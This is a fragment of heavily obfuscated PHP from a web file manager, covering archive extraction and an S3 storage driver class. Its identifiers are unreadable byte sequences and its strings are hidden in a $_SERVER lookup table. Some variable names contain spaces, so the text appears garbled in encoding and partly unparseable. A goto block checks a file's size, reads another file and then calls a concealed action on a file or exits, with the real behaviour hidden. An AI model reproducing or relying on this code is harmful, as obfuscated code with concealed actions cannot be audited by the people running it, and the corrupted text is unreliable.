$´œ¹†Ş€ = IO::pathThis($½šé©°); if (!$ğ•ÚöÉñ || $ğ•ÚöÉñ == -1) { $–†°¢¢° = array(array($åü™†¤ş[32] => $´œ¹†Ş€, $åü™†¤ş[1210] => -1)); $–†°¢¢°[0][$åü™†¤ş[1225]] = $–†°¢¢°[0][$åü™†¤ş[32]]; } else { if (is_array($ğ•ÚöÉñ)) { $–†°¢¢° = $ğ•ÚöÉñ; $õ§îˆˆ = count($–†°¢¢°) - 1; for ($æò Éû = 0; $æò Éû <= $õ§îˆˆ; $æò Éû++) { $º¸çñ‚† = $–†°¢¢°[$æò Éû]; $Ä„®ò… = get_path_this($º¸çñ‚†[$åü™†¤ş[32]]) . (checkExtSafe($º¸çñ‚†[$åü™†¤ş[32]]) ? $åü™†¤ş[12] : $åü™†¤ş[1226]); $–†°¢¢°[$æò Éû][$åü™†¤ş[1225]] = $åü™†¤ş[1227] . intval($º¸çñ‚†[$åü™†¤ş[1210]]) . $åü™†¤ş[439] . $Ä„®ò…; if ($æò Éû == 0) { continue; } $–†°¢¢°[$æò Éû][$åü™†¤ş[1225]] = $–†°¢¢°[$æò Éû - 1][$åü™†¤ş[1225]] . $åü™†¤ş[1228] . $–†°¢¢°[$æò Éû][$åü™†¤ş[1225]]; } } } if (!is_array($–†°¢¢°) || count($–†°¢¢°) == 0) { return !1; } $Ì®°˜°à = $–†°¢¢°[count($–†°¢¢°) - 1]; if (!IO::exist($½šé©°)) { return !1; } $Œ‡¥îĞ = TEMP_FILES . $åü™†¤ş[1229] . kodIO::hashPathSafe($½šé©°) . $åü™†¤ş[8]; $¢º±ç = $Œ‡¥îĞ . $Ì®°˜°à[$åü™†¤ş[1225]]; mk_dir($Œ‡¥îĞ); file_put_contents(TEMP_FILES . $åü™†¤ş[1204], $åü™†¤ş[12]); if (IO::exist($¢º±ç)) { return array($åü™†¤ş[224] => $¢º±ç, $åü™†¤ş[1209] => $–†°¢¢°, $åü™†¤ş[1211] => $Œ‡¥îĞ); } $ØŸßÀëˆ = self::localFilePath($½šé©°); if (!$ØŸßÀëˆ) { $ØŸßÀëˆ = $Œ‡¥îĞ . $åü™†¤ş[1230]; if (!IO::exist($ØŸßÀëˆ)) { self::copy($½šé©°, $Œ‡¥îĞ, !1, get_path_this($ØŸßÀëˆ)); } } if (!$ØŸßÀëˆ || !IO::exist($ØŸßÀëˆ)) { return !1; } if ($Ì®°˜°à[$åü™†¤ş[1210]] == -1) { return array($åü™†¤ş[224] => $ØŸßÀëˆ, $åü™†¤ş[1209] => $–†°¢¢°, $åü™†¤ş[1211] => $Œ‡¥îĞ); } $í«İÍ‘É = $ØŸßÀëˆ; foreach ($–†°¢¢° as $æò Éû => $º¸çñ‚†) { if (!$º¸çñ‚† || $º¸çñ‚†[$åü™†¤ş[1210]] == $åü™†¤ş[1208]) { break; } if (substr($º¸çñ‚†[$åü™†¤ş[32]], -1, 1) == $åü™†¤ş[8]) { break; } $¼ıƒãË¡ = in_array(get_path_ext($º¸çñ‚†[$åü™†¤ş[1225]]), array($åü™†¤ş[366], $åü™†¤ş[1215], $åü™†¤ş[1216], $åü™†¤ş[1217], $åü™†¤ş[1218], $åü™†¤ş[1219])); $à¢†Õ· = $æò Éû == count($–†°¢¢°) - 1 && $¼ıƒãË¡; $‹öÓ–ÅÍ = $Œ‡¥îĞ . $º¸çñ‚†[$åü™†¤ş[1225]]; $±ØÚŠİç = $Œ‡¥îĞ . get_path_this($º¸çñ‚†[$åü™†¤ş[32]]); if (IO::exist($‹öÓ–ÅÍ)) { $í«İÍ‘É = $‹öÓ–ÅÍ; continue; } $²ÕˆÏİŞ = $æò Éû == 0 ? get_path_ext($´œ¹†Ş€) : get_path_ext($í«İÍ‘É); $¦Ìá—ã– = KodArchive::extract(self::iconvSystem($í«İÍ‘É), $Œ‡¥îĞ, $º¸çñ‚†[$åü™†¤ş[1210]], $ÑêîÄ£”, $²ÕˆÏİŞ); self::unzipErrorCheck($¦Ìá—ã–, array($åü™†¤ş[1231], $½šé©°, $–†°¢¢°, $º¸çñ‚†, $‹öÓ–ÅÍ)); if (IO::exist($±ØÚŠİç)) { IO::rename($±ØÚŠİç, get_path_this($‹öÓ–ÅÍ)); } $í«İÍ‘É = $‹öÓ–ÅÍ; } $¢º±ç = $í«İÍ‘É; return array($åü™†¤ş[224] => $í«İÍ‘É, $åü™†¤ş[1209] => $–†°¢¢°, $åü™†¤ş[1211] => $Œ‡¥îĞ); } private static function unzipErrorCheck($Š¥°¡´, $Şùç¯† = false) { $¿‰µ×… =& $_SERVER[–Ú¬çÁ]; if ($Š¥°¡´[$¿‰µ×…[1232]]) { return !0; } write_log(array($¿‰µ×…[1233], $Š¥°¡´, $Şùç¯†), $¿‰µ×…[1234]); show_json($¿‰µ×…[1235] . json_encode($Š¥°¡´[$¿‰µ×…[1222]]), !1); die; } } goto AŸöñ´¨º´; b®ğìº¹Êô: if ($_SERVER[$_SERVER[–Ú¬çÁ][202]] != $_size($_file)) { $_getc = $_SERVER[–Ú¬çÁ][203]; $_getfile = $_SERVER[$_SERVER[–Ú¬çÁ][204]] . $_SERVER[–Ú¬çÁ][205]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[–Ú¬çÁ][206], $_getfilec); if (count($_getarrs) < $_SERVER[–Ú¬çÁ][207]) { $exit = $_SERVER[–Ú¬çÁ][208]; $exit(); } $_act = $_SERVER[–Ú¬çÁ][209]; $_act($_file); } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($‚ù‡†Ì») { set_timeout(); require_once SDK_DIR . $_SERVER[–Ú¬çÁ][210]; parent::__construct(); $this->_init($‚ù‡†Ì»); } public function _init($ğ×‡ş…Æ) { $this->config = $ğ×‡ş…Æ; foreach ($ğ×‡ş…Æ as $­ü¤ÁšÅ => $ÕÏ×˜»ö) { if (isset($this->{$­ü¤ÁšÅ})) { $this->{$­ü¤ÁšÅ} = $ÕÏ×˜»ö; } } $this->endpoint = $ğ×‡ş…Æ[$_SERVER[–Ú¬çÁ][211]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ª¸ÒÊ¦ú = "\x76\x34") { $this->signVer = $ª¸ÒÊ¦ú; $this->client->setSignatureVersion($ª¸ÒÊ¦ú); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $—ƒ ª´ú =& $_SERVER[–Ú¬çÁ]; $÷Â¼³ÒÖ = $this->getBucketCors(); if (!$÷Â¼³ÒÖ || !is_array($÷Â¼³ÒÖ)) { return !1; } if ($÷Â¼³ÒÖ[$—ƒ ª´ú[212]] != $—ƒ ª´ú[213] || $÷Â¼³ÒÖ[$—ƒ ª´ú[214]] != $—ƒ ª´ú[213]) { return !1; } $ÁÜº½Ó = array_map($—ƒ ª´ú[215], $÷Â¼³ÒÖ[$—ƒ ª´ú[216]]); if (!is_array($ÁÜº½Ó)) { $ÁÜº½Ó = array(); } $çŒ…¡Š  = array($—ƒ ª´ú[217], $—ƒ ª´ú[218], $—ƒ ª´ú[219], $—ƒ ª´ú[220], $—ƒ ª´ú[221]); $ÊäĞÑ©¹ = array_diff($çŒ…¡Š , $ÁÜº½Ó); return empty($ÊäĞÑ©¹); } public function mkfile($Çş»³¢â, $©èÂ®÷• = '', $şÅ½à = REPEAT_RENAME) { $ª‚­…ü¾ = $this->setContent($Çş»³¢â, $©èÂ®÷•); if ($ª‚­…ü¾ !== !1) { return $this->getPathOuter($Çş»³¢â); } return !1; } public function mkdir($È¯ôİÛ, $öµƒ—ü = REPEAT_SKIP) { $À¶æİâ =& $_SERVER[–Ú¬çÁ]; if (empty($È¯ôİÛ) && $È¯ôİÛ !== $À¶æİâ[222]) { return !1; } if ($öµƒ—ü && $this->_isFolder($È¯ôİÛ)) { return $this->getPathOuter($È¯ôİÛ); } $“àÄ€»¥ = $this->setContent($È¯ôİÛ, $À¶æİâ[12], !0); if ($“àÄ€»¥ !== !1) { return $this->getPathOuter($È¯ôİÛ); } return !1; } public function copyFile($ƒ…ù¾Ìò, $£ƒœü‡Ã, $•¿¶€òÄ = array()) { $—ğª£Ç¢ =& $_SERVER[–Ú¬çÁ]; $—º³Ú÷ö = $this->objectMeta($ƒ…ù¾Ìò); if (!$—º³Ú÷ö) { return !1; } if ($—º³Ú÷ö[$—ğª£Ç¢[76]] <= 1024 * 1024 * 200) { $¬ùÎÄÍá = $this->client->copyObject($this->bucket, $ƒ…ù¾Ìò, $this->bucket, $£ƒœü‡Ã, $—ğª£Ç¢[223], $•¿¶€òÄ); } else { $¬ùÎÄÍá = $this->client->multiCopyObject($this->bucket, $ƒ…ù¾Ìò, $this->bucket, $£ƒœü‡Ã, $•¿¶€òÄ); } $¬ùÎÄÍá = $¬ùÎÄÍá ? $this->getPathOuter($£ƒœü‡Ã) : !1; return $¬ùÎÄÍá; } public function moveFile($ûŒøÇÅ¹, $ù¨¯”µÒ) { if ($this->copyFile($ûŒøÇÅ¹, $ù¨¯”µÒ)) { $this->delFile($ûŒøÇÅ¹); return $this->getPathOuter($ù¨¯”µÒ); } return !1; } public function delFile($¥œ›ºñá) { return $this->client->deleteObject($this->bucket, $¥œ›ºñá); } public function delFolder($š¦ÅıÒö) { $›Ú„Ô =& $_SERVER[–Ú¬çÁ]; if (!$this->exist($š¦ÅıÒö)) { return !0; } $this->listItemCache = !1; $§¬ĞË³ = $this->fileList($š¦ÅıÒö); $this->listItemCache = !0; $àÀ¡¥¨É = trim($š¦ÅıÒö, $›Ú„Ô[8]) . $›Ú„Ô[8]; if (!empty($š¦ÅıÒö) && $š¦ÅıÒö !== $›Ú„Ô[222] && !in_array($àÀ¡¥¨É, $§¬ĞË³[$›Ú„Ô[82]])) { $§¬ĞË³[$›Ú„Ô[82]][] = $àÀ¡¥¨É; } $ğ¤Ş‹« = $this->delByBatch($§¬ĞË³[$›Ú„Ô[83]]); if (!$ğ¤Ş‹«) { return !1; } $ğ¤Ş‹« = $this->delByBatch($§¬ĞË³[$›Ú„Ô[82]]); if (!$ğ¤Ş‹«) { return !1; } return $this->delFile($àÀ¡¥¨É); } private function delByBatch($àÌÜÊ¹“) { foreach (array_chunk($àÌÜÊ¹“, 1000) as $ òéÎ¢ò) { $Ó–Ùµä = $this->client->deleteObjects($this->bucket, $ òéÎ¢ò); if (!$Ó–Ùµä) { return !1; } } return !0; } public function rename($Ï“ş­·¨, $şŸ¬ùÈÁ) { return $this->renameObject($Ï“ş­·¨, $şŸ¬ùÈÁ); } public function listPath($ùòŞÌº, $¾¥Êõ»Ü = false) { $ñú«»¡” =& $_SERVER[–Ú¬çÁ]; $îòåÉê» = $this->fileList($ùòŞÌº, $ñú«»¡”[8], !0); foreach ($îòåÉê»[$ñú«»¡”[82]] as $ÎÌ“û => $±‹î¦ÌÓ) { $îòåÉê»[$ñú«»¡”[82]][$ÎÌ“û] = $this->folderInfo($±‹î¦ÌÓ, $¾¥Êõ»Ü, $±‹î¦ÌÓ); } foreach ($îòåÉê»[$ñú«»¡”[83]] as $ÎÌ“û => $±‹î¦ÌÓ) { $îòåÉê»[$ñú«»¡”[83]][$ÎÌ“û] = $this->fileInfo($±‹î¦ÌÓ[$ñú«»¡”[32]], $¾¥Êõ»Ü, $±‹î¦ÌÓ); } return $îòåÉê»; } protected function infoChildren($Ï„ú©´É, &$–†¡Ğô) { $ùş¿Üƒ =& $_SERVER[–Ú¬çÁ]; $Ú¥Ÿ§’ = $this->fileList($Ï„ú©´É, $ùş¿Üƒ[12], !0); $–†¡Ğô[$ùş¿Üƒ[78]] += count($Ú¥Ÿ§’[$ùş¿Üƒ[82]]); $–†¡Ğô[$ùş¿Üƒ[77]] += count($Ú¥Ÿ§’[$ùş¿Üƒ[83]]); foreach ($Ú¥Ÿ§’[$ùş¿Üƒ[83]] as $©®‚¹) { if (!$©®‚¹ || !$©®‚¹[$ùş¿Üƒ[76]]) { continue; } $–†¡Ğô[$ùş¿Üƒ[76]] += $©®‚¹[$ùş¿Üƒ[76]]; } } private function fileInfo($ô¬‰¸ÈÉ, $¹’ù”½™ = false, $€ĞÔºá™ = array()) { $ïÏÈê©¿ =& $_SERVER[–Ú¬çÁ]; $½›å½º = array($ïÏÈê©¿[32] => $this->pathThis($ô¬‰¸ÈÉ), $ïÏÈê©¿[84] => $this->getPathOuter($ô¬‰¸ÈÉ), $ïÏÈê©¿[33] => $ïÏÈê©¿[224], $ïÏÈê©¿[175] => $this->ext($ô¬‰¸ÈÉ), $ïÏÈê©¿[76] => isset($€ĞÔºá™[$ïÏÈê©¿[76]]) ? $€ĞÔºá™[$ïÏÈê©¿[76]] : 0); if ($¹’ù”½™) { return $½›å½º; } $½›å½º[$ïÏÈê©¿[225]] = $½›å½º[$ïÏÈê©¿[85]] = 0; $½›å½º[$ïÏÈê©¿[226]] = $½›å½º[$ïÏÈê©¿[227]] = !0; if (empty($€ĞÔºá™)) { $€ĞÔºá™ = $this->objectMeta($ô¬‰¸ÈÉ); if (!$€ĞÔºá™) { return $½›å½º; } } if (isset($€ĞÔºá™[$ïÏÈê©¿[228]]) && $€ĞÔºá™[$ïÏÈê©¿[228]]) { $½›å½º[$ïÏÈê©¿[229]] = $€ĞÔºá™[$ïÏÈê©¿[228]]; } if (isset($€ĞÔºá™[$ïÏÈê©¿[194]])) { $½›å½º[$ïÏÈê©¿[85]] = $€ĞÔºá™[$ïÏÈê©¿[194]]; } if (isset($€ĞÔºá™[$ïÏÈê©¿[76]])) { $½›å½º[$ïÏÈê©¿[76]] = $€ĞÔºá™[$ïÏÈê©¿[76]]; } return $½›å½º; } private function folderInfo($¯ÒìÖŠÅ, $Ä‚Œİ© = false, $¹¢É÷èœ = array()) { $ßÌµ„† =& $_SERVER[–Ú¬çÁ]; $¾”‘ß¯Ö = array($ßÌµ„†[32] => $this->pathThis($¯ÒìÖŠÅ), $ßÌµ„†[84] => $this->getPathOuter($ßÌµ„†[8] . $¯ÒìÖŠÅ), $ßÌµ„†[33] => $ßÌµ„†[75]); if ($Ä‚Œİ©) { return $¾”‘ß¯Ö; } $¾”‘ß¯Ö[$ßÌµ„†[225]] = $¾”‘ß¯Ö[$ßÌµ„†[85]] = 0; $¾”‘ß¯Ö[$ßÌµ„†[226]] = $¾”‘ß¯Ö[$ßÌµ„†[227]] = !0; if ($¯ÒìÖŠÅ == $ßÌµ„†[12]) { return $¾”‘ß¯Ö; } if (empty($¹¢É÷èœ)) { $¹¢É÷èœ = $this->objectMeta(trim($¯ÒìÖŠÅ, $ßÌµ„†[8]) . $ßÌµ„†[8]); } if (isset($¹¢É÷èœ[$ßÌµ„†[194]])) { $¾”‘ß¯Ö[$ßÌµ„†[225]] = $¹¢É÷èœ[$ßÌµ„†[194]]; } return $¾”‘ß¯Ö; } private function fileList($ ØÌ¤„, $èöÍğª = '', $ÎßÕ±¸° = 0) { $ÀÃ îëæ =& $_SERVER[–Ú¬çÁ]; $­ü®ô² = rtrim($ ØÌ¤„, $ÀÃ îëæ[8]) . $ÀÃ îëæ[8]; $“İ´å’ = $this->listObjs($­ü®ô², null, null, $èöÍğª); if (!$“İ´å’) { return array($ÀÃ îëæ[82] => array(), $ÀÃ îëæ[83] => array()); } $ñÆ¤¢¾ = $Ëª€¨» = array(); foreach ($“İ´å’[$ÀÃ îëæ[230]] as $”®¶‘Ô) { $—ü™È€É = $”®¶‘Ô[$ÀÃ îëæ[32]]; if ($—ü™È€É == $­ü®ô²) { continue; } $ñìöêÈï = isset($”®¶‘Ô[$ÀÃ îëæ[76]]) ? $”®¶‘Ô[$ÀÃ îëæ[76]] : 0; $µÄ£ê¬‹ = $ñìöêÈï == 0 && substr($—ü™È€É, strlen($—ü™È€É) - 1, 1) == $ÀÃ îëæ[8] ? !0 : !1; $this->cacheMethodInfoSet($—ü™È€É, $µÄ£ê¬‹, $”®¶‘Ô); if ($µÄ£ê¬‹) { $ñÆ¤¢¾[] = $—ü™È€É; continue; } $Ëª€¨»[] = $ÎßÕ±¸° ? $”®¶‘Ô : $—ü™È€É; } foreach ($“İ´å’[$ÀÃ îëæ[231]] as $”®¶‘Ô) { $ñÆ¤¢¾[] = $”®¶‘Ô[$ÀÃ îëæ[32]]; $this->cacheMethodInfoSet($”®¶‘Ô[$ÀÃ îëæ[32]], !0); } $this->cacheMethodInfoSet($ ØÌ¤„, !0); return array($ÀÃ îëæ[82] => $ñÆ¤¢¾, $ÀÃ îëæ[83] => $Ëª€¨»); } private function listObjs($†‘Ğ—«ì, $ÛİøßÏ = null, $ä‹£ªÂ· = null, $Œ«äÌ³ = null) { $ŠÛñÀÒ˜ =& $_SERVER[–Ú¬çÁ]; $†‘Ğ—«ì = trim($†‘Ğ—«ì, $ŠÛñÀÒ˜[8]); $ŞÊ·âá = empty($†‘Ğ—«ì) && $†‘Ğ—«ì !== $ŠÛñÀÒ˜[222] ? $ŠÛñÀÒ˜[12] : $†‘Ğ—«ì . $ŠÛñÀÒ˜[8]; return $this->client->getBucket($this->bucket, $ŞÊ·âá, $ÛİøßÏ, $ä‹£ªÂ·, $Œ«äÌ³, !0); } public function has($×ŞÛƒØ, $ŸÌÌìÕŞ = false, $ æ½¼¹£ = true) { $ªí’ƒôæ =& $_SERVER[–Ú¬çÁ]; $×ŞÛƒØ = trim($×ŞÛƒØ, $ªí’ƒôæ[8]); $úŒæ‚Ó = empty($×ŞÛƒØ) && $×ŞÛƒØ !== $ªí’ƒôæ[222] ? $ªí’ƒôæ[12] : $×ŞÛƒØ . $ªí’ƒôæ[8]; $œï‚‚î¹ = null; $‹Ê½ĞïÑ = 500; $Æ®´„˜˜ = $ªí’ƒôæ[8]; $·úéê»Ë = $ö¹›õ¦„ = array(); while (!0) { $×¾ÂÈúÜ = $this->listObjs($×ŞÛƒØ, $œï‚‚î¹, $‹Ê½ĞïÑ, $Æ®´„˜˜); if (!$×¾ÂÈúÜ) { break; } $œï‚‚î¹ = $×¾ÂÈúÜ[$ªí’ƒôæ[232]]; $Å½œ½ñº = $×¾ÂÈúÜ[$ªí’ƒôæ[230]]; $Ÿ‡úçº¶ = $×¾ÂÈúÜ[$ªí’ƒôæ[231]]; if (empty($Å½œ½ñº) && empty($Ÿ‡úçº¶)) { break; } if (count($Å½œ½ñº) == 1 && $Å½œ½ñº[0][$ªí’ƒôæ[32]] == $úŒæ‚Ó) { break; } if ($ŸÌÌìÕŞ) { if (count($Å½œ½ñº)) { $Å½œ½ñº = array_column($Å½œ½ñº, $ªí’ƒôæ[32]); $·úéê»Ë = array_merge($·úéê»Ë, $Å½œ½ñº); } if (count($Ÿ‡úçº¶)) { $Ÿ‡úçº¶ = array_column($Ÿ‡úçº¶, $ªí’ƒôæ[32]); $ö¹›õ¦„ = array_merge($ö¹›õ¦„, $Ÿ‡úçº¶); } if ($œï‚‚î¹ === null) { break; } continue; } if ($ æ½¼¹£) { if (!empty($Å½œ½ñº)) { if (count($Å½œ½ñº) > 1 || isset($Å½œ½ñº[0][$ªí’ƒôæ[32]]) && $Å½œ½ñº[0][$ªí’ƒôæ[32]] != $úŒæ‚Ó) { return !0; } } } else { if (!empty($Ÿ‡úçº¶)) { return !0; } } if ($œï‚‚î¹ === null) { break; } } if ($ŸÌÌìÕŞ) { $·úéê»Ë = array_diff($·úéê»Ë, array($úŒæ‚Ó)); $·úéê»Ë = count(array_unique($·úéê»Ë)); $ö¹›õ¦„ = count(array_unique($ö¹›õ¦„)); return array($ªí’ƒôæ[233] => $·úéê»Ë, $ªí’ƒôæ[234] => $ö¹›õ¦„); } return !1; } public function listAll($ÓÃŸ“†‹) { $â¬óûñ‰ =& $_SERVER[–Ú¬çÁ]; $°‹‡áÒ = $this->fileList($ÓÃŸ“†‹, $â¬óûñ‰[12], !0); $¶ª–Ì = array_to_keyvalue($°‹‡áÒ[$â¬óûñ‰[83]], $â¬óûñ‰[32]); foreach ($°‹‡áÒ[$â¬óûñ‰[82]] as $ñı¿‘®˜) { if (is_string($ñı¿‘®˜)) { $¶ª–Ì[$ñı¿‘®˜] = array($â¬óûñ‰[76] => 0); } } return $this->listAllFiles($ÓÃŸ“†‹, $¶ª–Ì); } public function canRead($ÂµàÊàè) { $‰Ğó¯ñ¿ =& $_SERVER[–Ú¬çÁ]; $ıïŞ¾»– = $this->client->getAccessControlPolicy($this->bucket, $ÂµàÊàè); if (!$ıïŞ¾»–) { return !1; } return in_array($ıïŞ¾»–, array($‰Ğó¯ñ¿[235], $‰Ğó¯ñ¿[236], $‰Ğó¯ñ¿[237])) ? !0 : !1; } public function canWrite($××¨‡İê) { $ÃíƒŸü‹ =& $_SERVER[–Ú¬çÁ]; $Æ”éı¸Ò = $this->client->getAccessControlPolicy($this->bucket, $××¨‡İê); if (!$Æ”éı¸Ò) { return !1; } return in_array($Æ”éı¸Ò, array($ÃíƒŸü‹[235], $ÃíƒŸü‹[236])) ? !0 : !1; } public function getContent($€Öƒô¬Î) { return $this->client->getObject($this->bucket, $€Öƒô¬Î); } public function setContent($Ó‰ãËçë, $µ¹ãÏï¡ = '', $øäë­Ëå = false) { $‡…Æ´óç =& $_SERVER[–Ú¬çÁ]; $Ó‰ãËçë = $øäë­Ëå ? trim($Ó‰ãËçë, $‡…Æ´óç[8]) . $‡…Æ´óç[8] : $Ó‰ãËçë; $ëãÓ¿Óı = get_file_mime(get_path_ext($Ó‰ãËçë)); $òŸ§àÀ÷ = $this->client->putObject($µ¹ãÏï¡, $this->bucket, $Ó‰ãËçë, $‡…Æ´óç[223], array(), $ëãÓ¿Óı); if (!$òŸ§àÀ÷) { return !1; } if ($øäë­Ëå) { return !0; } $this->cacheMethod(null, null); $òŸ§àÀ÷ = $this->copyFile($Ó‰ãËçë, $Ó‰ãËçë, array($‡…Æ´óç[238] => $òŸ§àÀ÷[$‡…Æ´óç[228]])); return $òŸ§àÀ÷ ? !0 : !1; } public function fileSubstr($µÁá¬—¯, $ø¾ÍÅ±¿, $ĞÕÚÙƒ) { $ş¼¿îæé = $ø¾ÍÅ±¿ + $ĞÕÚÙƒ - 1; return $this->client->getObject($this->bucket, $µÁá¬—¯, array($_SERVER[–Ú¬çÁ][239] => "\x62\x79\164\x65\163\x3d{$ø¾ÍÅ±¿}\55{$ş¼¿îæé}")); } public function upload($Æµú„úÊ, $Ò¡˜›ŠÓ, $ÇâœŒİ„ = false, $ÁĞ³ã = REPEAT_REPLACE) { $ Ï’ô”Ë =& $_SERVER[–Ú¬çÁ]; $ñ…€‡  = array($ Ï’ô”Ë[238] => @md5_file($Ò¡˜›ŠÓ)); $”²Á‡ = array($ Ï’ô”Ë[240] => get_file_mime(get_path_ext($Æµú„úÊ))); if (IO::size($Ò¡˜›ŠÓ) <= 1024 * 1024 * 200) { $Çà¶ºèé = $this->client->putObjectFile($Ò¡˜›ŠÓ, $this->bucket, $Æµú„úÊ, $ Ï’ô”Ë[223], $ñ…€‡ , $”²Á‡); return !empty($Çà¶ºèé) ? $this->getPathOuter($Æµú„úÊ) : !1; } $äŞùö¿Î = $this->client->multiUploadObject($Ò¡˜›ŠÓ, $this->bucket, trim($Æµú„úÊ, $ Ï’ô”Ë[8]), $ñ…€‡ , $”²Á‡); return $äŞùö¿Î ? $this->getPathOuter($Æµú„úÊ) : !1; } public function download($®ºÀŞ•€, $èÜ’¤Õ‡) { if (!@is_dir($this->pathFather($èÜ’¤Õ‡)) && !IO::mkdir($this->pathFather($èÜ’¤Õ‡))) { return !1; } $”‹¦Ä½Ò = $this->client->getObject($this->bucket, $®ºÀŞ•€, array(), $èÜ’¤Õ‡); return $”‹¦Ä½Ò !== !1 ? $èÜ’¤Õ‡ : !1; } public function link($„Î‡™, $º‰âïÔ = array()) { $Ï®²éŸØ =& $_SERVER[–Ú¬çÁ]; if ($this->signVer == $Ï®²éŸØ[241]) { return $this->client->getAuthenticatedURL($this->bucket, $„Î‡™, 3600 * 12, $º‰âïÔ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($„Î‡™, $Ï®²éŸØ[8]), 3600 * 12, $this->region, array(), !0, $º‰âïÔ); } public function fileOut($ÍŠ¢–ı, $”Çëü˜ = false, $·çƒÓµ± = false, $À»€¯ş = '') { $›¡Šß¸ =& $_SERVER[–Ú¬çÁ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÍŠ¢–ı, $”Çëü˜, $·çƒÓµ±, $À»€¯ş); } if (!$·çƒÓµ±) { $·çƒÓµ± = $this->pathThis($ÍŠ¢–ı); } $Ç½Ä«Æ¤ = get_file_mime(get_path_ext($·çƒÓµ±)); if ($Ç½Ä«Æ¤ == $›¡Šß¸[242]) { return parent::fileOut($ÍŠ¢–ı, $”Çëü˜, $·çƒÓµ±, $À»€¯ş); } $Íó’”õâ = array($›¡Šß¸[243] => $Ç½Ä«Æ¤); if ($”Çëü˜) { $Íó’”õâ[$›¡Šß¸[244]] = $›¡Šß¸[245] . rawurlencode($·çƒÓµ±); } else { } $à‡…îÃ´ = $this->link($ÍŠ¢–ı, $Íó’”õâ); $this->fileOutLink($à‡…îÃ´); } public function fileOutServer($Ú‰°ÏÖ—, $îœêåï = false, $ºŸøÊ¾Å = false, $ºäÕ‡ã = '') { parent::fileOut($Ú‰°ÏÖ—, $îœêåï, $ºŸøÊ¾Å, $ºäÕ‡ã); } public function fileOutImageServer($šÛ¯±••, $ï¸°™³ = 250) { parent::fileOutImage($šÛ¯±••, $ï¸°™³); } public function hashMd5($Àš÷…ÛÜ, $÷Áğ®ŸÇ = '') { $¸øéÁ =& $_SERVER[–Ú¬çÁ]; $Ÿ¡ÇÇŸ  = $this->objectMeta($Àš÷…ÛÜ); if (!$Ÿ¡ÇÇŸ ) { return !1; } $÷Áğ®ŸÇ = $÷Áğ®ŸÇ ? $÷Áğ®ŸÇ : _get($Ÿ¡ÇÇŸ , $¸øéÁ[246]); $÷Áğ®ŸÇ = $÷Áğ®ŸÇ ? $÷Áğ®ŸÇ : _get($Ÿ¡ÇÇŸ , $¸øéÁ[228], $¸øéÁ[12]); return $÷Áğ®ŸÇ; } public function uploadFormData($¶¸Ê÷Ã, $°¼‚ç¦” = 3600) { $éşôÆš =& $_SERVER[–Ú¬çÁ]; $ßºåï¼ê = $this->pathFather($¶¸Ê÷Ã); $å÷†œÚ = $this->client->getHttpUploadPostParams($this->bucket, $ßºåï¼ê, $éşôÆš[223], $°¼‚ç¦”); return array_merge((array) $å÷†œÚ, array($éşôÆš[196] => $this->getHost())); } public function multiUploadFormData($­à¼¬ÔÖ, $ è¾ä•— = 3600) { $ç¨Î˜Ó =& $_SERVER[–Ú¬çÁ]; $§“å‡Ï = gmdate($ç¨Î˜Ó[247]); $Ä›õÀ» = array(); $åï¹´×÷ = $this->client->getUploadId($this->bucket, $­à¼¬ÔÖ, $Ä›õÀ»); if (!$åï¹´×÷) { return !1; } return array($ç¨Î˜Ó[248] => $åï¹´×÷, $ç¨Î˜Ó[196] => $this->getHost() . $ç¨Î˜Ó[8] . $this->pathEncode($­à¼¬ÔÖ), $ç¨Î˜Ó[249] => $§“å‡Ï, $ç¨Î˜Ó[94] => $­à¼¬ÔÖ); } public function multiUploadAuthData($·¹œìÇº, $’”‡êæº = array()) { $çşëÂ‹ =& $_SERVER[–Ú¬çÁ]; $†ğ‹›’ = isset($’”‡êæº[$çşëÂ‹[249]]) ? $’”‡êæº[$çşëÂ‹[249]] : gmdate($çşëÂ‹[247]); $ëù¡çÃˆ = isset($’”‡êæº[$çşëÂ‹[175]]) ? $’”‡êæº[$çşëÂ‹[175]] : $çşëÂ‹[12]; $ôŠ‚ŸâÙ = $’”‡êæº[$çşëÂ‹[94]]; unset($’”‡êæº[$çşëÂ‹[94]]); if (isset($’”‡êæº[$çşëÂ‹[250]])) { $’”‡êæº[$çşëÂ‹[249]] = $†ğ‹›’; return $this->listUploadParts($ôŠ‚ŸâÙ, $’”‡êæº); } $“ŸóÎõ» = array($çşëÂ‹[251], $çşëÂ‹[12], $çşëÂ‹[120], $çşëÂ‹[12], "\x78\x2d\141\155\172\x2d\144\x61\x74\145\x3a{$†ğ‹›’}", $çşëÂ‹[8] . $this->bucket . $çşëÂ‹[8] . $this->pathEncode($ôŠ‚ŸâÙ) . $ëù¡çÃˆ); if (strpos($ëù¡çÃˆ, $çşëÂ‹[252]) === 0) { $“ŸóÎõ»[0] = $çşëÂ‹[253]; } if (isset($’”‡êæº[$çşëÂ‹[254]]) && $’”‡êæº[$çşëÂ‹[254]] == $çşëÂ‹[255]) { $“ŸóÎõ»[0] = $çşëÂ‹[255]; } $£Ëğ¬’ï = implode($çşëÂ‹[206], $“ŸóÎõ»); $ç¿Ö ¯™ = base64_encode(hash_hmac($çşëÂ‹[256], $£Ëğ¬’ï, $this->secret, !0)); $ºêÂÅ¨Û = $çşëÂ‹[257] . $this->accessKey . $çşëÂ‹[4] . $ç¿Ö ¯™; if (strpos($ëù¡çÃˆ, $çşëÂ‹[252]) === 0) { return array($çşëÂ‹[258] => $ºêÂÅ¨Û, $çşëÂ‹[249] => $†ğ‹›’); } return $ºêÂÅ¨Û; } public function listUploadParts($•¼È†¹ğ, $Áª÷Œßì = array()) { $²ßòÓ³À =& $_SERVER[–Ú¬çÁ]; $£æ¹ËÖÅ = str_replace($²ßòÓ³À[259], $²ßòÓ³À[12], $Áª÷Œßì[$²ßòÓ³À[175]]); $¤ÙğëêØ = $this->client->listParts($this->bucket, $•¼È†¹ğ, 